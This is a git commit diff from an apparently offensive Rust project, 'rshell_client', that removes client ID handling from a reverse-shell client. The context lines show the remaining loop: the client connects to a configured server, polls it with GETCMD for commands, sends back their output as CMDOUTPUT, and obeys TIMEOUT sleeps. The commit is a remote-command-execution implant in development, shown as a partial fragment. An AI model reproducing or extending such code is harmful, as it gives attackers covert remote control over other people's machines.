b9b73798fee3b204790e60b000f0d8f67e33861e
Mathuiss <mathijsgeerlings@gmail.com>
2021-07-09 16:39:24 +0200

    Removed ID funct

--- rshell_client/src/rshp_client.rs
+++ rshell_client/src/rshp_client.rs
@@ -5,28 +5,24 @@ use std::thread;
 use std::time::Duration;
 
 pub struct RshpClient {
-    id: u32,
     transporter: Transporter,
 }
 
 impl RshpClient {
     pub fn new(server: &str, port: u32) -> RshpClient {
         RshpClient {
-            id: 0,
             transporter: Transporter::new(server, port),
         }
     }
 
     pub fn run(&mut self) {
-        // Check ID settings
-        self.check_id();
-
         loop {
             // Poll for new commands
             // GETCMD [int]id
             // CMD [string]buf
-            let id = format!("{}", self.id);
-            let req = Cmd::new("GETCMD", id.as_ref());
+            // let id = format!("{}", self.id);
+            
+            let req = Cmd::new("GETCMD", "");
             self.transporter.send(req);
 
             // If TIMEOUT [int]sec sleep for [int]sec seconds and poll again
@@ -39,7 +35,6 @@ impl RshpClient {
 
     fn interperet(&mut self, cmd: Cmd) {
         match cmd.get_directive().as_ref() {
-            "SETID" => self.id = cmd.get_data().parse::<u32>().unwrap(),
             "TIMEOUT" => {
                 let timeout = cmd.get_data().parse::<u64>().unwrap();
                 thread::sleep(Duration::from_secs(timeout));
@@ -49,20 +44,6 @@ impl RshpClient {
                 self.transporter.send(Cmd::new("CMDOUTPUT", output.as_ref()))
             },
             _ => {},
-        }
-    }
-
-    // Check if ID has been assigned
-    // If not signed, sign in with id
-    // req: GETNEWID
-    // resp: SETID [int]id
-    fn check_id(&mut self) {
-        if self.id == 0 {
-            let cmd = Cmd::new("GETNEWID", "");
-            self.transporter.send(cmd);
-            
-            let resp = self.transporter.recv();
-            self.interperet(resp);
         }
     }
 }
